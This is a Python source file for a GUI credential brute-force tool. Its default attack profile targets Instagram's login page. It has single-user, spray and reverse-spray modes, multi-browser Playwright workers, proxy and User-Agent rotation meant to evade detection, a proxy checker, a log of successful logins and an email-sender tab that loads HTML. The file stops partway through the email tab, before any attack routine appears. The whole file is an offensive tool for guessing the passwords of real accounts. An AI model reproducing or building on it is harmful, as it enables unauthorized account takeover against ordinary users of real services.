#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Professional Brute Force Tool - Burp-Style GUI (2026 Edition)
- Master password protection (first-time setup)
- Custom attack configurations (save/load)
- Proxy support with rotation
- User-Agent rotation
- Multi-threaded browser workers
- Proxy checker, email sender
- Full color customization (saved persistently)
- Resizable log panels (horizontal and vertical) with adjustable font size
- Horizontal scrollbars for long logs
- Modern rounded corners design
"""

import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk, colorchooser, simpledialog
import threading
import queue
import time
import os
import json
import random
import hashlib
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import requests

# ---------- Paths ----------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COLORS_CONFIG_FILE = os.path.join(SCRIPT_DIR, "colors_config.json")
ATTACKS_FILE = os.path.join(SCRIPT_DIR, "attacks_config.json")
PASSWORD_FILE = os.path.join(SCRIPT_DIR, ".tool_pass.hash")

# ---------- Default Instagram Config ----------
DEFAULT_CONFIG = {
    "name": "Instagram (Default)",
    "url": "https://www.instagram.com/accounts/login/",
    "username_field_type": "name",
    "username_field_selector": "email",
    "password_field_type": "name",
    "password_field_selector": "pass",
    "submit_button_selector": "button[type='submit']",
    "success_indicator": "url_change",
    "success_text": "",
    "timeout": 5000,
}

# ---------- Default 2026 Theme Colors ----------
DEFAULT_COLORS = {
    "bg": "#1a1a2e",
    "fg": "#e6e6e6",
    "entry_bg": "#16213e",
    "entry_fg": "#e6e6e6",
    "button_bg": "#0f3460",
    "button_fg": "#ffffff",
    "tab_bg": "#16213e",
    "tab_fg": "#e6e6e6",
    "log_bg": "#0f0f1a",
    "log_fg": "#c0c0c0",
    "stats_bg": "#16213e",
    "stats_fg": "#e6e6e6",
    "success_fg": "#4caf50",
    "failure_fg": "#f44336",
}


class AttackConfigDialog:
    """Dialog for adding/editing an attack configuration."""
    def __init__(self, parent, config=None):
        self.parent = parent
        self.config = config.copy() if config else {}
        self.result = None
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Attack Configuration" if not config else "Edit Attack Configuration")
        self.dialog.geometry("500x500")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        self.create_widgets()
        self.dialog.wait_window()

    def create_widgets(self):
        frame = ttk.Frame(self.dialog, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="Name:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.name_var = tk.StringVar(value=self.config.get("name", ""))
        ttk.Entry(frame, textvariable=self.name_var, width=40).grid(row=0, column=1, padx=5, pady=2)

        ttk.Label(frame, text="Login URL:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.url_var = tk.StringVar(value=self.config.get("url", ""))
        ttk.Entry(frame, textvariable=self.url_var, width=40).grid(row=1, column=1, padx=5, pady=2)

        # Username field
        ttk.Label(frame, text="Username Field:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        uname_frame = ttk.Frame(frame)
        uname_frame.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        self.uname_type = tk.StringVar(value=self.config.get("username_field_type", "name"))
        ttk.Radiobutton(uname_frame, text="name=", variable=self.uname_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(uname_frame, text="id=", variable=self.uname_type, value="id").pack(side=tk.LEFT)
        self.uname_selector = tk.StringVar(value=self.config.get("username_field_selector", ""))
        ttk.Entry(uname_frame, textvariable=self.uname_selector, width=15).pack(side=tk.LEFT, padx=5)

        # Password field
        ttk.Label(frame, text="Password Field:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        pwd_frame = ttk.Frame(frame)
        pwd_frame.grid(row=3, column=1, sticky=tk.W, padx=5, pady=2)
        self.pwd_type = tk.StringVar(value=self.config.get("password_field_type", "name"))
        ttk.Radiobutton(pwd_frame, text="name=", variable=self.pwd_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(pwd_frame, text="id=", variable=self.pwd_type, value="id").pack(side=tk.LEFT)
        self.pwd_selector = tk.StringVar(value=self.config.get("password_field_selector", ""))
        ttk.Entry(pwd_frame, textvariable=self.pwd_selector, width=15).pack(side=tk.LEFT, padx=5)

        # Submit button selector
        ttk.Label(frame, text="Submit Button (CSS):").grid(row=4, column=0, sticky=tk.W, padx=5, pady=2)
        self.submit_selector = tk.StringVar(value=self.config.get("submit_button_selector", ""))
        ttk.Entry(frame, textvariable=self.submit_selector, width=40).grid(row=4, column=1, padx=5, pady=2)

        # Success indicator
        ttk.Label(frame, text="Success Indicator:").grid(row=5, column=0, sticky=tk.W, padx=5, pady=2)
        ind_frame = ttk.Frame(frame)
        ind_frame.grid(row=5, column=1, sticky=tk.W, padx=5, pady=2)
        self.indicator = tk.StringVar(value=self.config.get("success_indicator", "url_change"))
        ttk.Radiobutton(ind_frame, text="URL change (no 'login' in URL)", variable=self.indicator, value="url_change").pack(anchor=tk.W)
        ttk.Radiobutton(ind_frame, text="Text in page", variable=self.indicator, value="text").pack(anchor=tk.W)
        self.success_text_var = tk.StringVar(value=self.config.get("success_text", ""))
        ttk.Entry(ind_frame, textvariable=self.success_text_var, width=30).pack(anchor=tk.W, padx=20, pady=2)

        # Timeout
        ttk.Label(frame, text="Timeout (ms):").grid(row=6, column=0, sticky=tk.W, padx=5, pady=2)
        self.timeout_var = tk.IntVar(value=self.config.get("timeout", 5000))
        ttk.Spinbox(frame, from_=1000, to=30000, textvariable=self.timeout_var, width=10).grid(row=6, column=1, sticky=tk.W, padx=5, pady=2)

        # Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=7, column=0, columnspan=2, pady=10)
        ttk.Button(btn_frame, text="Save", command=self.save).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Cancel", command=self.cancel).pack(side=tk.LEFT, padx=5)

    def save(self):
        name = self.name_var.get().strip()
        if not name:
            messagebox.showerror("Error", "Name is required.")
            return
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "URL is required.")
            return
        self.result = {
            "name": name,
            "url": url,
            "username_field_type": self.uname_type.get(),
            "username_field_selector": self.uname_selector.get(),
            "password_field_type": self.pwd_type.get(),
            "password_field_selector": self.pwd_selector.get(),
            "submit_button_selector": self.submit_selector.get(),
            "success_indicator": self.indicator.get(),
            "success_text": self.success_text_var.get(),
            "timeout": self.timeout_var.get(),
        }
        self.dialog.destroy()

    def cancel(self):
        self.result = None
        self.dialog.destroy()


class BruteForceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Force Tool - 2026 Edition")
        self.root.geometry("1500x900")
        self.root.minsize(1000, 600)
        self.root.resizable(True, True)

        # ---------- Variables ----------
        # Attack mode
        self.mode = tk.StringVar(value="single")
        # Credentials
        self.username_single = tk.StringVar()
        self.userlist_path = tk.StringVar()
        self.passlist_path = tk.StringVar()
        self.pass_single = tk.StringVar()
        # Proxy
        self.use_proxy = tk.BooleanVar(value=True)
        self.proxy_path = tk.StringVar()
        self.proxy_type = tk.StringVar(value="socks5")
        # User-Agent
        self.useragent_path = tk.StringVar()
        # Browser visibility
        self.show_browser = tk.BooleanVar(value=True)
        # Number of browsers
        self.num_browsers = tk.IntVar(value=2)

        # Log font size
        self.log_font_size = tk.IntVar(value=9)

        # Custom colors
        self.custom_colors = DEFAULT_COLORS.copy()
        self.load_color_config()

        # Log format settings
        self.log_fields = {
            "timestamp": tk.BooleanVar(value=True),
            "attempt_num": tk.BooleanVar(value=True),
            "username": tk.BooleanVar(value=True),
            "password": tk.BooleanVar(value=True),
            "proxy": tk.BooleanVar(value=True),
            "result": tk.BooleanVar(value=True),
        }

        # Attack configurations
        self.attacks = []
        self.selected_attack = None
        self.attack_mode = tk.StringVar(value="saved")
        self.custom_url = tk.StringVar()
        self.username_field_type = tk.StringVar(value="name")
        self.username_field_selector = tk.StringVar()
        self.password_field_type = tk.StringVar(value="name")
        self.password_field_selector = tk.StringVar()
        self.submit_button_selector = tk.StringVar()
        self.success_indicator = tk.StringVar(value="url_change")
        self.success_text = tk.StringVar()
        self.timeout_var = tk.IntVar(value=5000)

        # Runtime
        self.running = False
        self.stop_flag = threading.Event()
        self.log_queue = queue.Queue()      # (msg, success_flag)
        self.success_queue = queue.Queue()
        self.stats_queue = queue.Queue()

        # Proxy checker
        self.proxy_check_path = tk.StringVar()
        self.proxy_check_result_text = None

        # Email sender
        self.email_sender = tk.StringVar()
        self.email_password = tk.StringVar()
        self.email_receiver = tk.StringVar()
        self.email_html_path = tk.StringVar()
        self.email_log_text = None

        # Load saved attacks
        self.load_attacks_data()

        # Build UI
        self.create_widgets()
        self.update_attack_dropdown()
        self.apply_theme()
        self.update_gui()

    # ---------- Attack Config Management ----------
    def load_attacks_data(self):
        if os.path.exists(ATTACKS_FILE):
            try:
                with open(ATTACKS_FILE, 'r', encoding='utf-8') as f:
                    self.attacks = json.load(f)
            except:
                self.attacks = []
        if not any(a.get("name") == "Instagram (Default)" for a in self.attacks):
            self.attacks.append(DEFAULT_CONFIG.copy())
            self.save_attacks()

    def save_attacks(self):
        with open(ATTACKS_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.attacks, f, indent=4)

    def update_attack_dropdown(self):
        if hasattr(self, 'attack_combobox') and self.attack_combobox:
            names = [a["name"] for a in self.attacks]
            self.attack_combobox['values'] = names
            if self.selected_attack:
                try:
                    idx = names.index(self.selected_attack["name"])
                    self.attack_combobox.current(idx)
                except ValueError:
                    self.attack_combobox.current(0)
                    self.selected_attack = self.attacks[0] if self.attacks else None
            elif self.attacks:
                self.attack_combobox.current(0)
                self.selected_attack = self.attacks[0]

    def on_attack_selected(self, event):
        idx = self.attack_combobox.current()
        if 0 <= idx < len(self.attacks):
            self.selected_attack = self.attacks[idx]
            self.custom_url.set(self.selected_attack["url"])
            self.username_field_type.set(self.selected_attack["username_field_type"])
            self.username_field_selector.set(self.selected_attack["username_field_selector"])
            self.password_field_type.set(self.selected_attack["password_field_type"])
            self.password_field_selector.set(self.selected_attack["password_field_selector"])
            self.submit_button_selector.set(self.selected_attack["submit_button_selector"])
            self.success_indicator.set(self.selected_attack["success_indicator"])
            self.success_text.set(self.selected_attack.get("success_text", ""))
            self.timeout_var.set(self.selected_attack.get("timeout", 5000))
        else:
            self.selected_attack = None

    def add_attack(self):
        dialog = AttackConfigDialog(self.root)
        if dialog.result:
            if any(a["name"] == dialog.result["name"] for a in self.attacks):
                messagebox.showerror("Error", "An attack with this name already exists.")
                return
            self.attacks.append(dialog.result)
            self.save_attacks()
            self.update_attack_dropdown()

    def edit_attack(self):
        if not self.selected_attack:
            messagebox.showerror("Error", "No attack selected.")
            return
        dialog = AttackConfigDialog(self.root, self.selected_attack)
        if dialog.result:
            idx = self.attacks.index(self.selected_attack)
            self.attacks[idx] = dialog.result
            self.save_attacks()
            self.selected_attack = self.attacks[idx]
            self.update_attack_dropdown()
            self.on_attack_selected(None)

    def delete_attack(self):
        if not self.selected_attack:
            messagebox.showerror("Error", "No attack selected.")
            return
        if self.selected_attack["name"] == "Instagram (Default)":
            messagebox.showerror("Error", "Cannot delete the default Instagram attack.")
            return
        if messagebox.askyesno("Confirm Delete", f"Delete attack '{self.selected_attack['name']}'?"):
            self.attacks.remove(self.selected_attack)
            self.save_attacks()
            self.selected_attack = None
            self.update_attack_dropdown()

    # ---------- GUI Construction ----------
    def create_widgets(self):
        # Configure ttk style for modern look
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('Rounded.TButton', borderradius=10, padding=6)
        self.style.configure('Rounded.TEntry', borderradius=8, padding=4)
        self.style.configure('Rounded.TCombobox', borderradius=8, padding=4)

        # Notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Tabs
        self.target_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.target_tab, text="Target")
        self.attack_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.attack_tab, text="Attack")
        self.colors_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.colors_tab, text="Colors")
        self.proxy_check_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.proxy_check_tab, text="Proxy Checker")
        self.email_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.email_tab, text="Email Sender")

        self.create_target_tab()
        self.create_attack_tab()
        self.create_colors_tab()
        self.create_proxy_check_tab()
        self.create_email_tab()

        self.mode.trace_add("write", self.on_mode_change)
        self.on_mode_change()

    def create_target_tab(self):
        frame = ttk.Frame(self.target_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        # Attack selection bar
        attack_sel_frame = ttk.LabelFrame(frame, text="Saved Attacks", padding=5)
        attack_sel_frame.pack(fill=tk.X, pady=5)

        self.attack_combobox = ttk.Combobox(attack_sel_frame, state="readonly", width=50, style='Rounded.TCombobox')
        self.attack_combobox.pack(side=tk.LEFT, padx=5, pady=5)
        self.attack_combobox.bind("<<ComboboxSelected>>", self.on_attack_selected)

        ttk.Button(attack_sel_frame, text="New", style='Rounded.TButton', command=self.add_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(attack_sel_frame, text="Edit", style='Rounded.TButton', command=self.edit_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(attack_sel_frame, text="Delete", style='Rounded.TButton', command=self.delete_attack).pack(side=tk.LEFT, padx=2)

        # Target mode
        mode_frame = ttk.LabelFrame(frame, text="Target Mode", padding=5)
        mode_frame.pack(fill=tk.X, pady=5)
        ttk.Radiobutton(mode_frame, text="Use Saved Attack", variable=self.attack_mode, value="saved").pack(anchor=tk.W)
        ttk.Radiobutton(mode_frame, text="Custom (Edit below)", variable=self.attack_mode, value="custom").pack(anchor=tk.W)

        # Custom settings
        custom_frame = ttk.LabelFrame(frame, text="Custom Target Settings", padding=10)
        custom_frame.pack(fill=tk.X, pady=5)

        ttk.Label(custom_frame, text="Login URL:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        ttk.Entry(custom_frame, textvariable=self.custom_url, width=50, style='Rounded.TEntry').grid(row=0, column=1, padx=5, pady=2)

        ttk.Label(custom_frame, text="Username Field:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        uname_frame = ttk.Frame(custom_frame)
        uname_frame.grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)
        ttk.Radiobutton(uname_frame, text="name=", variable=self.username_field_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(uname_frame, text="id=", variable=self.username_field_type, value="id").pack(side=tk.LEFT)
        ttk.Entry(uname_frame, textvariable=self.username_field_selector, width=20, style='Rounded.TEntry').pack(side=tk.LEFT, padx=5)

        ttk.Label(custom_frame, text="Password Field:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        pwd_frame = ttk.Frame(custom_frame)
        pwd_frame.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        ttk.Radiobutton(pwd_frame, text="name=", variable=self.password_field_type, value="name").pack(side=tk.LEFT)
        ttk.Radiobutton(pwd_frame, text="id=", variable=self.password_field_type, value="id").pack(side=tk.LEFT)
        ttk.Entry(pwd_frame, textvariable=self.password_field_selector, width=20, style='Rounded.TEntry').pack(side=tk.LEFT, padx=5)

        ttk.Label(custom_frame, text="Submit Button (CSS):").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        ttk.Entry(custom_frame, textvariable=self.submit_button_selector, width=40, style='Rounded.TEntry').grid(row=3, column=1, padx=5, pady=2)

        ttk.Label(custom_frame, text="Success Indicator:").grid(row=4, column=0, sticky=tk.W, padx=5, pady=2)
        ind_frame = ttk.Frame(custom_frame)
        ind_frame.grid(row=4, column=1, sticky=tk.W, padx=5, pady=2)
        ttk.Radiobutton(ind_frame, text="URL change (no 'login' in URL)", variable=self.success_indicator, value="url_change").pack(anchor=tk.W)
        ttk.Radiobutton(ind_frame, text="Text in page", variable=self.success_indicator, value="text").pack(anchor=tk.W)
        ttk.Entry(ind_frame, textvariable=self.success_text, width=30, style='Rounded.TEntry').pack(anchor=tk.W, padx=20, pady=2)

        ttk.Label(custom_frame, text="Timeout (ms):").grid(row=5, column=0, sticky=tk.W, padx=5, pady=2)
        self.timeout_entry = ttk.Entry(custom_frame, textvariable=self.timeout_var, width=10, style='Rounded.TEntry')
        self.timeout_entry.grid(row=5, column=1, sticky=tk.W, padx=5, pady=2)

        def on_mode_change(*args):
            state = tk.NORMAL if self.attack_mode.get() == "custom" else tk.DISABLED
            for child in custom_frame.winfo_children():
                if isinstance(child, (ttk.Entry, ttk.Radiobutton)):
                    child.config(state=state)
            self.timeout_entry.config(state=state)
        self.attack_mode.trace_add("write", on_mode_change)
        on_mode_change()

    def create_attack_tab(self):
        # ========== VERTICAL PANED FOR RESIZABLE LOGS ==========
        vpaned = ttk.PanedWindow(self.attack_tab, orient=tk.VERTICAL)
        vpaned.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # ---------- Top part: Attack Settings (fixed height) ----------
        top_frame = ttk.LabelFrame(vpaned, text="Attack Settings", padding=10)
        vpaned.add(top_frame, weight=0)

        # Attack mode
        mode_frame = ttk.LabelFrame(top_frame, text="Attack Mode", padding=5)
        mode_frame.grid(row=0, column=0, columnspan=2, sticky=tk.W+tk.E, padx=5, pady=5)
        ttk.Radiobutton(mode_frame, text="Single Username + Password List", variable=self.mode, value="single").pack(anchor=tk.W)
        ttk.Radiobutton(mode_frame, text="Username List + Password List (Spray)", variable=self.mode, value="multi").pack(anchor=tk.W)
        ttk.Radiobutton(mode_frame, text="Single Password + Username List (Reverse)", variable=self.mode, value="reverse").pack(anchor=tk.W)

        # Input fields
        input_frame = ttk.Frame(top_frame)
        input_frame.grid(row=1, column=0, sticky=tk.W+tk.E, padx=5, pady=5)

        self.username_label = ttk.Label(input_frame, text="Username:")
        self.username_entry = ttk.Entry(input_frame, textvariable=self.username_single, width=30, style='Rounded.TEntry')
        self.username_label.grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.username_entry.grid(row=0, column=1, padx=5, pady=2)

        self.userlist_label = ttk.Label(input_frame, text="Username List:")
        self.userlist_entry = ttk.Entry(input_frame, textvariable=self.userlist_path, width=30, style='Rounded.TEntry')
        self.userlist_btn = ttk.Button(input_frame, text="Browse", style='Rounded.TButton', command=lambda: self.browse_file(self.userlist_path))
        self.userlist_label.grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.userlist_entry.grid(row=1, column=1, padx=5, pady=2)
        self.userlist_btn.grid(row=1, column=2, padx=5)
        self.userlist_label.grid_remove()
        self.userlist_entry.grid_remove()
        self.userlist_btn.grid_remove()

        self.passlist_label = ttk.Label(input_frame, text="Password List:")
        self.passlist_entry = ttk.Entry(input_frame, textvariable=self.passlist_path, width=30, style='Rounded.TEntry')
        self.passlist_btn = ttk.Button(input_frame, text="Browse", style='Rounded.TButton', command=lambda: self.browse_file(self.passlist_path))
        self.passlist_label.grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        self.passlist_entry.grid(row=2, column=1, padx=5, pady=2)
        self.passlist_btn.grid(row=2, column=2, padx=5)

        self.pass_single_label = ttk.Label(input_frame, text="Password:")
        self.pass_single_entry = ttk.Entry(input_frame, textvariable=self.pass_single, width=30, style='Rounded.TEntry')
        self.pass_single_label.grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        self.pass_single_entry.grid(row=3, column=1, padx=5, pady=2)
        self.pass_single_label.grid_remove()
        self.pass_single_entry.grid_remove()

        # Proxy settings
        proxy_frame = ttk.LabelFrame(top_frame, text="Proxy Settings", padding=5)
        proxy_frame.grid(row=2, column=0, sticky=tk.W+tk.E, padx=5, pady=5, columnspan=2)

        self.use_proxy_var = ttk.Checkbutton(proxy_frame, text="Use Proxies", variable=self.use_proxy,
                                             command=self.toggle_proxy_widgets)
        self.use_proxy_var.pack(anchor=tk.W)

        proxy_inner = ttk.Frame(proxy_frame)
        proxy_inner.pack(fill=tk.X, padx=10)

        ttk.Label(proxy_inner, text="Proxy List:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.proxy_entry = ttk.Entry(proxy_inner, textvariable=self.proxy_path, width=30, style='Rounded.TEntry')
        self.proxy_entry.grid(row=0, column=1, padx=5)
        self.proxy_browse_btn = ttk.Button(proxy_inner, text="Browse", style='Rounded.TButton', command=lambda: self.browse_file(self.proxy_path))
        self.proxy_browse_btn.grid(row=0, column=2, padx=5)

        ttk.Label(proxy_inner, text="Proxy Type:").grid(row=1, column=0, sticky=tk.W, padx=5)
        proxy_type_frame = ttk.Frame(proxy_inner)
        proxy_type_frame.grid(row=1, column=1, sticky=tk.W)
        for text, value in [("SOCKS5", "socks5"), ("SOCKS4", "socks4"), ("HTTP", "http")]:
            ttk.Radiobutton(proxy_type_frame, text=text, variable=self.proxy_type, value=value).pack(side=tk.LEFT, padx=5)

        # User-Agent list frame
        ua_frame = ttk.LabelFrame(top_frame, text="User-Agent Rotation", padding=5)
        ua_frame.grid(row=3, column=0, sticky=tk.W+tk.E, padx=5, pady=5, columnspan=2)

        ttk.Label(ua_frame, text="User-Agent List:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.ua_entry = ttk.Entry(ua_frame, textvariable=self.useragent_path, width=40, style='Rounded.TEntry')
        self.ua_entry.grid(row=0, column=1, padx=5, pady=2)
        ttk.Button(ua_frame, text="Browse", style='Rounded.TButton', command=lambda: self.browse_file(self.useragent_path)).grid(row=0, column=2, padx=5, pady=2)
        ttk.Label(ua_frame, text="(One UA per line, will rotate randomly)").grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)

        # Browsers and visibility
        browsers_frame = ttk.Frame(top_frame)
        browsers_frame.grid(row=4, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Label(browsers_frame, text="Number of Browsers:").pack(side=tk.LEFT, padx=5)
        self.browsers_spin = ttk.Spinbox(browsers_frame, from_=1, to=10, textvariable=self.num_browsers, width=5)
        self.browsers_spin.pack(side=tk.LEFT, padx=5)
        ttk.Checkbutton(browsers_frame, text="Show Browser Windows", variable=self.show_browser).pack(side=tk.LEFT, padx=10)

        # Log format
        log_format_frame = ttk.LabelFrame(top_frame, text="Log Format", padding=5)
        log_format_frame.grid(row=5, column=0, columnspan=2, sticky=tk.W+tk.E, padx=5, pady=5)

        fields = [
            ("Timestamp", "timestamp"),
            ("Attempt #", "attempt_num"),
            ("Username", "username"),
            ("Password", "password"),
            ("Proxy", "proxy"),
            ("Result", "result"),
        ]
        for i, (label, key) in enumerate(fields):
            cb = ttk.Checkbutton(log_format_frame, text=label, variable=self.log_fields[key])
            cb.grid(row=0, column=i, padx=5, pady=2, sticky=tk.W)

        # Buttons and font size
        btn_frame = ttk.Frame(top_frame)
        btn_frame.grid(row=6, column=0, columnspan=2, pady=10)

        self.start_btn = ttk.Button(btn_frame, text="Start Attack", style='Rounded.TButton', command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=10)
        self.stop_btn = ttk.Button(btn_frame, text="Stop", style='Rounded.TButton', command=self.stop_attack, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        ttk.Button(btn_frame, text="Clear Logs", style='Rounded.TButton', command=self.clear_logs).pack(side=tk.LEFT, padx=10)

        ttk.Label(btn_frame, text="Log Font Size:").pack(side=tk.LEFT, padx=(20,5))
        font_sizes = [8,9,10,11,12,14,16,18,20]
        font_combo = ttk.Combobox(btn_frame, textvariable=self.log_font_size, values=font_sizes, width=5, state='readonly')
        font_combo.pack(side=tk.LEFT, padx=5)
        font_combo.bind("<<ComboboxSelected>>", self.change_log_font_size)

        # ---------- Bottom part: Logs (resizable) ----------
        bottom_frame = ttk.Frame(vpaned)
        vpaned.add(bottom_frame, weight=1)

        # Horizontal PanedWindow for left/right logs
        main_frame = ttk.PanedWindow(bottom_frame, orient=tk.HORIZONTAL)
        main_frame.pack(fill=tk.BOTH, expand=True)

        left_frame = ttk.LabelFrame(main_frame, text="All Attempts Log", padding=5)
        main_frame.add(left_frame, weight=1)
        self.log_text = scrolledtext.ScrolledText(left_frame, wrap=tk.NONE, font=("Courier", self.log_font_size.get()))
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.tag_configure("success", foreground=self.custom_colors["success_fg"], font=("Courier", self.log_font_size.get(), "bold"))
        self.log_text.tag_configure("failure", foreground=self.custom_colors["failure_fg"])

        right_frame = ttk.LabelFrame(main_frame, text="Successful Logins", padding=5)
        main_frame.add(right_frame, weight=1)
        self.success_text = scrolledtext.ScrolledText(right_frame, wrap=tk.NONE, font=("Courier", self.log_font_size.get()))
        self.success_text.pack(fill=tk.BOTH, expand=True)

        # Statistics
        stats_frame = ttk.LabelFrame(bottom_frame, text="Statistics", padding=5)
        stats_frame.pack(fill=tk.X, pady=5)

        self.stats_labels = {}
        stats_info = [
            ("Total Attempts:", "total"),
            ("Tested:", "tested"),
            ("Proxy Rotations:", "rotations"),
            ("Current Proxy:", "current_proxy"),
            ("Time Elapsed:", "elapsed"),
            ("Remaining:", "remaining"),
            ("Status:", "status"),
        ]
        for label_text, key in stats_info:
            row = ttk.Frame(stats_frame)
            row.pack(side=tk.LEFT, padx=10, pady=2)
            ttk.Label(row, text=label_text).pack(side=tk.LEFT)
            lbl_val = ttk.Label(row, text="--", anchor=tk.W, relief=tk.SUNKEN, width=15)
            lbl_val.pack(side=tk.LEFT, padx=5)
            self.stats_labels[key] = lbl_val

        # Adjust weights so that the bottom part (logs) can be resized
        # The PanedWindow already handles it with weight=1 for bottom_frame

    def create_colors_tab(self):
        frame = ttk.Frame(self.colors_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        # Color pickers for each element
        color_items = [
            ("Main Background", "bg"),
            ("Text Color", "fg"),
            ("Entry Background", "entry_bg"),
            ("Entry Text", "entry_fg"),
            ("Button Background", "button_bg"),
            ("Button Text", "button_fg"),
            ("Tab Background", "tab_bg"),
            ("Tab Text", "tab_fg"),
            ("Log Background", "log_bg"),
            ("Log Text", "log_fg"),
            ("Stats Background", "stats_bg"),
            ("Stats Text", "stats_fg"),
            ("Success Color", "success_fg"),
            ("Failure Color", "failure_fg"),
        ]

        row = 0
        for label, key in color_items:
            ttk.Label(frame, text=f"{label}:").grid(row=row, column=0, sticky=tk.W, padx=5, pady=2)
            btn = ttk.Button(frame, text="Choose", style='Rounded.TButton', command=lambda k=key: self.pick_color(k))
            btn.grid(row=row, column=1, padx=5, pady=2, sticky=tk.W)
            lbl_color = ttk.Label(frame, text=self.custom_colors[key], background=self.custom_colors[key], width=15)
            lbl_color.grid(row=row, column=2, padx=5, pady=2)
            row += 1

        # Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=row, column=0, columnspan=3, pady=10)

        ttk.Button(btn_frame, text="Apply Colors", style='Rounded.TButton', command=self.apply_theme).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Reset to 2026 Theme", style='Rounded.TButton', command=self.reset_to_default_theme).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save Colors", style='Rounded.TButton', command=self.save_color_config).pack(side=tk.LEFT, padx=5)

    def create_proxy_check_tab(self):
        frame = ttk.Frame(self.proxy_check_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="Proxy List File:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.proxy_check_entry = ttk.Entry(frame, textvariable=self.proxy_check_path, width=50, style='Rounded.TEntry')
        self.proxy_check_entry.grid(row=0, column=1, padx=5, pady=5)
        ttk.Button(frame, text="Browse", style='Rounded.TButton', command=lambda: self.browse_file(self.proxy_check_path)).grid(row=0, column=2, padx=5, pady=5)

        ttk.Label(frame, text="Timeout (seconds):").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.proxy_timeout = tk.IntVar(value=5)
        ttk.Spinbox(frame, from_=1, to=30, textvariable=self.proxy_timeout, width=5).grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)

        ttk.Label(frame, text="Threads:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        self.proxy_threads = tk.IntVar(value=10)
        ttk.Spinbox(frame, from_=1, to=50, textvariable=self.proxy_threads, width=5).grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)

        self.proxy_check_btn = ttk.Button(frame, text="Start Proxy Check", style='Rounded.TButton', command=self.start_proxy_check)
        self.proxy_check_btn.grid(row=3, column=0, columnspan=3, pady=10)

        ttk.Label(frame, text="Results:").grid(row=4, column=0, sticky=tk.W, padx=5, pady=5)
        self.proxy_check_result_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=20, font=("Courier", 9))
        self.proxy_check_result_text.grid(row=5, column=0, columnspan=3, padx=5, pady=5, sticky=tk.NSEW)

        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(5, weight=1)

    def create_email_tab(self):
        frame = ttk.Frame(self.email_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="Sender Email:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.email_sender, width=40, style='Rounded.TEntry').grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(frame, text="App Password:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.email_password, width=40, show="*", style='Rounded.TEntry').grid(row=1, column=1, padx=5, pady=5)

        ttk.Label(frame, text="Receiver Email:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.email_receiver, width=40, style='Rounded.TEntry').grid(row=2, column=1, padx=5, pady=5)

